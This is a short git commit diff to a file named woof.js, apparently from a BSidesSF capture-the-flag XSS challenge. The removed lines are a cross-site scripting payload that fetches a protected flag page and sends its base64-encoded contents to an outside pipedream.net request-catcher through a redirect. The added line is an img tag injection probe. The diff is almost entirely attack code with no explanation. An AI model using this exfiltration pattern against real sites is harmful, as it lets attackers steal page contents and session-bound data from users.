40102250273c6f3d4712b52aaba25eb7f5c03444
ShamanJD <eugene.ptashko@gmail.com>
2024-05-19 13:21:03 +0500

    Update woof.js

--- woof.js
+++ woof.js
@@ -1,8 +1,1 @@
-var xhr = new XMLHttpRequest();
-xhr.open('GET','https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag',true);
-xhr.send();
-xhr.onload = function() {
-
-	window.location="https://eoalqdv1yrob2tu.m.pipedream.net/?a="+btoa(xhr.response);
-  
-};
+<img srcset="/monitor" srcset="/monitor">
